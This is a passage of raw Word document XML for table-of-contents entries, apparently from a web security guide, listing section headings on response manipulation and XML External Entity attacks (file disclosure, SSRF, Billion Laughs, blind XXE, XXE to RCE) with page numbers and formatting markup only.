            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>What is Response Manipulation?</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408649 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>47</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4EB12743" w14:textId="25A4D82E" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408650" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Types of Response Manipulation</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408650 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>47</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7D3C1FF6" w14:textId="44EF845E" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408651" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>How It Works</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408651 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>47</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="06A30C6B" w14:textId="627CC3A7" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408652"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_Toc208408652 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>47</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="38201580" w14:textId="0505FCC8" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408653" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Exploitation Techniques</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408653 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>47</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="41E5A4EB" w14:textId="2E695294" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408654"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_Toc208408654 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>48</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="21F4A7E9" w14:textId="08A1CA50" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408655" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Times New Roman" w:hAnsi="Calibri"/>
                <w:noProof/>
              </w:rPr>
              <w:t>XML External ENTITY Attack (XXE)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408655 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>48</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="41DA55A2" w14:textId="0E967076" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408656" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>How XXE Works</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408656 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>48</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="70140655" w14:textId="0C1BD00B" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408657" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Types of XXE Attacks</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408657 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>48</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4B43ECF4" w14:textId="48E0B06D" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408658" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>File Disclosure</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408658 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>48</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="07E63312" w14:textId="32A1ADA8" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408659" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>SSRF (Server-Side Request Forgery)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408659 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>49</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2541F8A1" w14:textId="4ACEDF3D" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408660" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Denial of Service (Billion Laughs)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408660 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>49</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6EEC1014" w14:textId="0EF3617C" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408661" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Out-of-Band XXE (Blind XXE)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408661 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>49</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7131B611" w14:textId="65103548" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408662" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>XXE to RCE</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408662 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>49</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1B228C1C" w14:textId="52628A76" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408663"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_Toc208408663 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>49</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1765D13C" w14:textId="63A1288F" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408664" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Exploitation Techniques</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408664 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>49</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3818B414" w14:textId="1EC54A2C" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408665" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Tools</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408665 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>49</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="26C12F78" w14:textId="5458DEB6" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408666"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_Toc208408666 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>50</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5C46DE04" w14:textId="66AEC6CB" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
